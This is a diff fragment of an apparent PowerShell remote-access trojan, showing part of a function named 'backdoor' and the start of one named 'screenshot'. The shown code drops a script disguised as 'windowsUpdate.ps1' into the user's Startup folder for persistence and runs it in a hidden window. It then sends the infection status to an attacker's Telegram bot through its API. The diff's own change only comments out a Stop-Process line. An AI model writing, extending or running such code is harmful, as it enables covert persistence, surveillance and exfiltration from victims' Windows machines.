@@ -28,12 +28,13 @@ function backdoor {
         Add-Content "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1" $text
         ##Copy-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1" -Destination "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1"
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
-        Invoke-Expression -Command:$command 
-        Stop-Process -Name "comandos" -Confirm -PassThru
+        Invoke-Expression -Command:$command
 
         # Check backdoor
         $checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
+
+        #Stop-Process -Name "comandos" -Confirm -PassThru
 }
 
 function screenshot {
